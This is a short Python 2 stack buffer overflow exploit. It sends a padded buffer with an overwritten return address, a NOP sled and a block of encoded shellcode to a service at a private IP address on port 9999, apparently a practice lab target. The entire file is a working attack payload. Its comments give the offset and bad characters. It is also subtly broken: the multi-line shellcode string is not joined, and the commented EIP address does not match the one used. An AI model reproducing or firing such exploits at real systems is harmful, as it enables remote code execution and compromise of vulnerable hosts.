#!/usr/bin/python 
import socket 
import os
# EIP crashed at 36724135 and after 524 bytes 
# total lenght = 1000 bytes 
# "C" * 469  
# nullbytes 'badchar' == "\x00" 
# EIP overwrite 77B71EF2 

shellcode = "\xdb\xcd\xb8\x98\xae\x9a\x1b\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x43\x13\x03\xdb\xbd\x78\xee\x27\x29\xfe"
"\x11\xd7\xaa\x9f\x98\x32\x9b\x9f\xff\x37\x8c\x2f\x8b\x15\x21"
"\xdb\xd9\x8d\xb2\xa9\xf5\xa2\x73\x07\x20\x8d\x84\x34\x10\x8c"
"\x06\x47\x45\x6e\x36\x88\x98\x6f\x7f\xf5\x51\x3d\x28\x71\xc7"
"\xd1\x5d\xcf\xd4\x5a\x2d\xc1\x5c\xbf\xe6\xe0\x4d\x6e\x7c\xbb"
"\x4d\x91\x51\xb7\xc7\x89\xb6\xf2\x9e\x22\x0c\x88\x20\xe2\x5c"
"\x71\x8e\xcb\x50\x80\xce\x0c\x56\x7b\xa5\x64\xa4\x06\xbe\xb3"
"\xd6\xdc\x4b\x27\x70\x96\xec\x83\x80\x7b\x6a\x40\x8e\x30\xf8"
"\x0e\x93\xc7\x2d\x25\xaf\x4c\xd0\xe9\x39\x16\xf7\x2d\x61\xcc"
"\x96\x74\xcf\xa3\xa7\x66\xb0\x1c\x02\xed\x5d\x48\x3f\xac\x09"
"\xbd\x72\x4e\xca\xa9\x05\x3d\xf8\x76\xbe\xa9\xb0\xff\x18\x2e"
"\xb6\xd5\xdd\xa0\x49\xd6\x1d\xe9\x8d\x82\x4d\x81\x24\xab\x05"
"\x51\xc8\x7e\x89\x01\x66\xd1\x6a\xf1\xc6\x81\x02\x1b\xc9\xfe"
"\x33\x24\x03\x97\xde\xdf\xc4\x58\xb6\xde\x17\x31\xc5\xe0\x16"
"\x7a\x40\x06\x72\x6c\x05\x91\xeb\x15\x0c\x69\x8d\xda\x9a\x14"
"\x8d\x51\x29\xe9\x40\x92\x44\xf9\x35\x52\x13\xa3\x90\x6d\x89"
"\xcb\x7f\xff\x56\x0b\x09\x1c\xc1\x5c\x5e\xd2\x18\x08\x72\x4d"
"\xb3\x2e\x8f\x0b\xfc\xea\x54\xe8\x03\xf3\x19\x54\x20\xe3\xe7"
"\x55\x6c\x57\xb8\x03\x3a\x01\x7e\xfa\x8c\xfb\x28\x51\x47\x6b"
"\xac\x99\x58\xed\xb1\xf7\x2e\x11\x03\xae\x76\x2e\xac\x26\x7f"
"\x57\xd0\xd6\x80\x82\x50\xe6\xca\x8e\xf1\x6f\x93\x5b\x40\xf2"
"\x24\xb6\x87\x0b\xa7\x32\x78\xe8\xb7\x37\x7d\xb4\x7f\xa4\x0f"
"\xa5\x15\xca\xbc\xc6\x3f"  

buffer = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 121 + shellcode 

print 'payload sent'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

s.connect(('192.168.1.55',9999))

s.send(buffer + "\r\n")

s.close()
